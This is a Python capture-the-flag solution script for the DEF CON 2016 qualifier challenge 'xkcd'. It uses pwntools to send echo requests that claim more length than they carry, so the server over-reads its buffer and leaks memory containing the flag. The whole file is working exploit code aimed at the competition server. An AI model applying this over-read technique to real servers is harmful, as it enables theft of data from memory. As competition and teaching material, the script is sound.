#
# DEF CON CTF Quals 2016
# xkcd (baby's first/1)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

from pwn import *

host = 'xkcd_be4bf26fcb93f9ab8aa193efaad31c3b.quals.shallweplayaga.me'
port = 1354

padding_string = 'A'*512
flag = ''

for overread_count in xrange(1, 257):
	h = remote(host, port, timeout = None)
	exploit_string = 'SERVER, ARE YOU STILL THERE? IF SO, REPLY "%s" (%d)' % (padding_string, 512 + overread_count)
	h.sendline(exploit_string)
	m = h.recvline()
	if ('NICE TRY' in m):
		break
	else:
		print m

	flag = m[512:]
	h.close()

print "[+] Flag: [%s]" % flag